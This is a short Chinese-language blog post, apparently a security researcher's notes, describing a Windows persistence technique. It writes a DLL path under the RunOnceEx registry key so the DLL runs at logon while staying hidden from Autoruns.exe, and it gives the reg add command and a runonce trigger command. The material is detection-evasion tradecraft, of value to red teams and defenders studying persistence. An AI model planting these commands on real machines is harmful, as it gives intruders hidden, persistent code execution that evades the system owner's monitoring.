---
title: RunOnceEx
date: 2018-03-22 22:31:14
tags: Windows
categories: Windows
---
![enter description here][1]
<!--more-->
## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/RunOnceEx.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>


## 使用RunOnceEx进行持久化 - 隐藏自Autoruns.exe

1.发现一种技术来执行DLL文件，而不会在登录时被autoruns.exe检测到。
 需要管理员权限，不属于userland。
 
 
 运行这个漏洞
``` stylus
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Users\demon\mbox.dll"
```
![enter description here][2]


2.mbox.dll将在下次登录时启动。或者你可以运行这个命令来触发执行：

``` stylus
runonce /Explorer 
```


链接(link)：https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/
https://support.microsoft.com/en-us/help/310593/description-of-the-runonceex-registry-key

  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/111B9E88668CCEEF802CA5E4F80BEF12.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1521729671229.jpg